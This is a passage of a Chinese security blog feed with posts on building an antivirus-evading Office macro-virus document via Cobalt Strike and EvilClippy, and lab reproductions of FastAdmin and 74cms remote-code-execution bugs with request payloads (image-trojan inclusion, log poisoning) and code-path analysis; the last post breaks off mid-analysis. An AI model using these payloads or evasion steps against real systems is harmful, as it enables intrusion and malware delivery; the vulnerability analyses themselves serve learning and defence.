src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/6.png"></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p><a href="http://wjlshare.com/archives/1509#0x03_TemplatesImpl">http://wjlshare.com/archives/1509#0x03_TemplatesImpl</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    本篇文章依旧是参照代码审计的知识星球里的《JAVA安全漫谈系列》的文章。&lt;/p&gt;
&lt;h1 id=&quot;1-什么是Java的字节码&quot;&gt;&lt;a href=&quot;#1-什么是Java的字节码&quot; class=&quot;headerlink&quot; title=&quot;1.什么是Java的字节码&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Office宏病毒文件制作以及简单免杀</title>
    <link href="https://reader-l.github.io/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/"/>
    <id>https://reader-l.github.io/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/</id>
    <published>2021-03-28T10:07:21.000Z</published>
    <updated>2021-03-28T10:42:32.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-获取恶意VBA代码"><a href="#1-获取恶意VBA代码" class="headerlink" title="1.获取恶意VBA代码"></a>1.获取恶意VBA代码</h1><p>​    在这里用CS来进行演示：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1.png"></p><p>选取设置你的监听器：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/2.png"></p><p>复制CS生成的宏病毒VBA代码：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/3.png"></p><h1 id="2-将打开Office对宏的支持"><a href="#2-将打开Office对宏的支持" class="headerlink" title="2.将打开Office对宏的支持"></a>2.将打开Office对宏的支持</h1><p>打开word文档，点击选项功能。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/4.png"></p><p>在word选项中的<code>自定义功能区</code>中点击对<code>开发工具</code>的支持</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/5.png"></p><h1 id="3-创建宏病毒文件"><a href="#3-创建宏病毒文件" class="headerlink" title="3.创建宏病毒文件"></a>3.创建宏病毒文件</h1><p>创建文档并创建宏</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/6.png"></p><p>而后将CS生成的VBA代码复制进去，保存后即可创建完成。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/7.png"></p><p>当目标点击<code>启用宏</code>的选项之后就会上线：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/9.png"></p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/10.png"></p><p>当然，基础的office宏病毒文件是无法逃过杀软的查杀的，需要进行一定的免杀处理。</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/8.png"></p><h1 id="4-利用工具免杀躲过杀软"><a href="#4-利用工具免杀躲过杀软" class="headerlink" title="4.利用工具免杀躲过杀软"></a>4.利用工具免杀躲过杀软</h1><p><strong>EvilClippy是一款专用于创建恶意MS Office测试文档的跨平台安全工具，它可以隐藏VBA宏和VBA代码，并且可以对宏代码进行混淆处理以增加宏分析工具的分析难度。当前版本的EvilClippy支持在Linux、macOS和Windows平台上运行，实现了跨平台特性。</strong></p><p>下载链接：<a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p><p>根据该工具的介绍：</p><h2 id="工具的安装："><a href="#工具的安装：" class="headerlink" title="工具的安装："></a>工具的安装：</h2><p>在Linux下使用该工具需要先安装：<code>Mono</code></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo apt-<span class="hljs-built_in">get</span>  install  <span class="hljs-built_in">mono</span>-complete<br></code></pre></td></tr></table></figure><p>然后用如下命令即可编译成功：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mono-csc /reference:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">OpenMcdf</span>.</span></span>dll,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span><span class="hljs-module"><span class="hljs-identifier">IO</span>.</span><span class="hljs-module"><span class="hljs-identifier">Compression</span>.</span><span class="hljs-module"><span class="hljs-identifier">FileSystem</span>.</span></span>dll /out:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClippy</span>.</span></span>exe *.cs<br></code></pre></td></tr></table></figure><h2 id="工具的使用（免杀）："><a href="#工具的使用（免杀）：" class="headerlink" title="工具的使用（免杀）："></a>工具的使用（免杀）：</h2><p>首先创建一个正常的vba代码文件，因为该工具的原理就是利用正常的vba代码和带有宏病毒vba代码的文件进行混淆来绕过杀软的查杀。</p><p>test.vba</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">Sub</span> <span class="hljs-function"><span class="hljs-title">test</span>()</span><br><br><span class="hljs-variable">Dim</span> <span class="hljs-variable">X</span><br><br><span class="hljs-variable">X</span> = <span class="hljs-function"><span class="hljs-title">MsgBox</span>(<span class="hljs-string">&quot;test&quot;</span>)</span><br></code></pre></td></tr></table></figure><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/11.png"></p><p>然后执行如下命令</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClippy</span>.</span></span>exe -s test.vba <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Doc1</span>.</span></span>doc<br></code></pre></td></tr></table></figure><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/12.png"></p><h1 id="5-效果"><a href="#5-效果" class="headerlink" title="5.效果"></a>5.效果</h1><p>成功上线</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/13.png"></p><p>同时用杀软进行查杀没有任何警报：</p><p><img src="/2021/03/28/Office%E5%AE%8F%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6%E5%88%B6%E4%BD%9C%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/14.png"></p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://www.freebuf.com/articles/terminal/202408.html">https://www.freebuf.com/articles/terminal/202408.html</a></p><p><a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-获取恶意VBA代码&quot;&gt;&lt;a href=&quot;#1-获取恶意VBA代码&quot; class=&quot;headerlink&quot; title=&quot;1.获取恶意VBA代码&quot;&gt;&lt;/a&gt;1.获取恶意VBA代码&lt;/h1&gt;&lt;p&gt;​    在这里用CS来进行演示：&lt;/p&gt;
&lt;p&gt;&lt;img src=</summary>
      
    
    
    
    <category term="钓鱼" scheme="https://reader-l.github.io/categories/%E9%92%93%E9%B1%BC/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞复现-Fastadmin前台Getshell漏洞</title>
    <link href="https://reader-l.github.io/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/"/>
    <id>https://reader-l.github.io/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-27T12:13:00.000Z</published>
    <updated>2021-03-27T14:52:07.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>​    FastAdmin是一款基于ThinkPHP5+Bootstrap开发的极速后台开发框架。FastAdmin基于Apache2.0开源协议发布，目前被广泛应用于各大行业应用后台管理。</p><h1 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2.漏洞影响版本"></a>2.漏洞影响版本</h1><p>影响版本：V1.0.0.20180911_beta - V1.0.0.20200506_beta</p><p><a href="https://www.fastadmin.net/download.html">https://www.fastadmin.net/download.html</a></p><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h1><p>首先在会员中心界面注册个账号<code>http://192.168.199.246:3333/fastadmin/public/index/user/login.html</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/1.png"></p><p>在会员中心的个人资料功能处的设置头像的地方存在图片马上传位置。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/2.png"></p><p>得到图片马的位置。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/3.png"></p><p>payload:</p><p><code>http://192.168.199.246:3333/fastadmin/public/index/user/_empty?name=../../public/uploads/20210327/07d0d501fe8b3c67b74dc050fc6c8516.jpg</code></p><p>POST:<code>reader=phpinfo();</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/4.png"></p><h1 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h1><p>从漏洞利用的payload来看，index模块下的User的控制器下的<code>_empty</code>是我们接受我们传入的payload的位置。</p><p>可以看到我们传入的数据到了<code>application/index/controller/User.php</code>代码第64行<code>_empty</code>方法中的<code>fetch</code>方法</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/5.png"></p><p>从如下代码可知，<code>fetch</code>调用的是<code>fastadmin/thinkphp/library/think/View.php</code>下的<code>View</code>类的<code>fetch</code>方法。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/6.png"></p><p>跟进<code>thinkphp/library/think/View.php</code>下的<code>View</code>类的<code>fetch</code>方法，因为<code>$renderContent</code>默认为<code>false</code>，所以<code>$method</code>变量值为<code>fetch</code>，又因为<code>fastadmin</code>默认的模板解析引擎是<code>think</code>，所以代码第163行为<code>$this-&gt;think-&gt;fetch</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/7.png"></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/8.png"></p><p>跟进<code>/thinkphp/library/think/view/driver/Think.php</code>下的<code>Think</code>类的<code>fetch</code>方法。</p><p>在代码第86行，调用了<code>fastadmin/thinkphp/library/think/Template.php</code>下的<code>Template</code>类的<code>fetch</code>方法来处理<code>$template</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/9.png"></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/10.png"></p><p>跟进<code>fastadmin/thinkphp/library/think/Template.php</code>下的<code>Template</code>类的<code>fetch</code>方法</p><p>在代码181行，程序获取了<code>$template</code>文件的内容赋值给了<code>$content</code>，在代码第178行，获取缓存文件名<code>$cacheFile</code>。在代码第179行，对<code>$cacheFile</code>文件名进行是不是已经存在的缓存文件名进行判断，如果不存在，则进入到判断语句里面，将<code>$content</code>和<code>$cacheFile</code>传入<code>Template.php</code>的<code>Template</code>类的<code>compiler</code>生成缓存文件。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/11.png"></p><p>跟进<code>thinkphp/library/think/Template.php</code>的<code>Template</code>类的<code>compiler</code>方法，从代码中我们可以看见并没有对我们传入的一句话进行任何的破坏，就进行了编译存储。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/12.png"></p><p>跟进<code>thinkphp/library/think/template/driver/File.php</code>的<code>write</code>方法，在代码第34行，可以看见写入操作，将我们的恶意代码给写入了。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/13.png"></p><p>写入的缓存文件在<code>/runtime/temp/1af0cc51ce493cfc44754f95c95c0f0d.php</code>，可以看到正常写入了。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/14.png"></p><p>返回<code>thinkphp/library/think/Template.php</code>，在代码188行，看到存在一句话木马的缓存文件名<code>$cacheFile</code>传入了<code>thinkphp/library/think/template/driver/File.php</code>的<code>read</code>方法</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/15.png"></p><p>跟进<code>thinkphp/library/think/template/driver/File.php</code>的<code>read</code>方法：</p><p>进行了文件包含，触发了漏洞。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastadmin%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E/16.png"></p><h1 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h1><p>官方的修复方法是直接将<code>application/index/controller/User.php</code>下的<code>_empty</code>给删除掉了。</p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://doc.fastadmin.net/docs">https://doc.fastadmin.net/docs</a></p><p><a href="http://www.xisewbms.cn/?post=465">http://www.xisewbms.cn/?post=465</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-简介&quot;&gt;&lt;a href=&quot;#1-简介&quot; class=&quot;headerlink&quot; title=&quot;1.简介&quot;&gt;&lt;/a&gt;1.简介&lt;/h1&gt;&lt;p&gt;​    FastAdmin是一款基于ThinkPHP5+Bootstrap开发的极速后台开发框架。FastAdmin基于A</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://reader-l.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞复现-骑士CMS文件包含导致远程代码执行漏洞</title>
    <link href="https://reader-l.github.io/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://reader-l.github.io/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-27T02:29:47.000Z</published>
    <updated>2021-03-27T10:51:24.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>这个漏洞2020年的时候就已经出了，但是我现在复现分析学习[doge]。觉得对自己的提升最好的途径还是代码吧。以后有新漏洞的出现，我一定会尽量及时复现分析学习。</p><h1 id="2-漏洞环境搭建与复现"><a href="#2-漏洞环境搭建与复现" class="headerlink" title="2.漏洞环境搭建与复现"></a>2.漏洞环境搭建与复现</h1><h2 id="1-漏洞环境搭建"><a href="#1-漏洞环境搭建" class="headerlink" title="1.漏洞环境搭建"></a>1.漏洞环境搭建</h2><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p><p>​    看了官方发的通告，可以知道漏洞在6.0.48版本得到了修复。（具体修复方法，后面在分析。）</p><p>​    所以以下两个版本是存在漏洞的。我是选择了6.0.40版本来进行复现。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p>搭建后，访问index.php正常出现如下界面，即证明搭建成功。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>74cms的URL模式默认是采用tp3.2的普通模式。</p><p><code>m参数表示模块，c参数表示控制器，a参数表示操作/⽅法，后⾯的表示其他GET参数</code></p><p>漏洞url：<a href="http://127.0.0.1:3333/74cms/index.php?m=home&amp;a=assign_resume_tpl">http://127.0.0.1:3333/74cms/index.php?m=home&amp;a=assign_resume_tpl</a></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>漏洞payload：<code>variable=1&amp;tpl=&lt;?php phpinfo(); ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#39;id&#39;]&quot;/&gt;</code></p><p>先用以上的payload，将恶意代码写进日志文件里。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>然后再用如下payload：<code>variable=1&amp;tpl=data/Runtime/Logs/Home/21_03_27.log</code></p><p>包含日志文件，即可成功执行php代码。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p><h1 id="3-漏洞分析学习"><a href="#3-漏洞分析学习" class="headerlink" title="3.漏洞分析学习"></a>3.漏洞分析学习</h1><p>​    骑士CMS官方通报的文章是说：在<code>Application/Common/Controller/BaseController.class.php</code>中的<code>BaseController</code>类的<code>assign_resume_tpl</code>方法存在了风险：</p><p>添加红框中的代码对<code>$tpl</code>变量值是否是一个正常的文件进行了判断。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"></p><p>跟进<code>fetch</code>，来到了Controller类的fetch方法</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png"></p><p>​    从以上两张图片中的代码来看，可以知道<code>$templateFile</code>=<code>$tpl</code>参数值会传到<code>ThinkPHP/Library/Think/View.class.php</code></p><p>由于<code>$content</code>为空，因此<code>$templateFile</code>变量会先到代码108行<code>parseTemplate</code>进行处理。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>如果<code>$template</code>是一个正常的文件的话，那就会直接原样返回。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png"></p><p>由于不是使用PHP原生模板，所以会进入到如下判断语句中。解析<code>view_parse</code>标签。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png"></p><p>跟进<code>/ThinkPHP/Library/Think/Hook.class.php </code>，</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png"></p><p>查看一下<code>ThinkPHP/Mode/common.php</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/14.png"></p><p>并跟进<code>ThinkPHP/Library/Think/Hook.class.php的exec</code>方法，可以发现最终会到<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>文件下的<code>ParseTemplateBehavior</code>类的<code>run</code>方法。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>因为采用的是Think模板引擎，所以会进入第一个判断语句。</p><p>同时，若当前是第一次加载解析模板的话，则会调用<code>ThinkPHP/Library/Think/Template.class.php</code>下的<code>Template</code>类的<code>fetch</code>方法。</p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>跟进<code>Template</code>类的<code>fetch</code>方法：</p><p><code>$templateFile</code>变量传入了<code>loadTemplate</code></p><p><img src="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>跟进<code>loadTemplate</code>，由于布局设置默认是关闭的。所以进入到第一个判断语句后，赋值给<code>$tmplContent</code>直接传入到<code>compiler</code></p><p><img 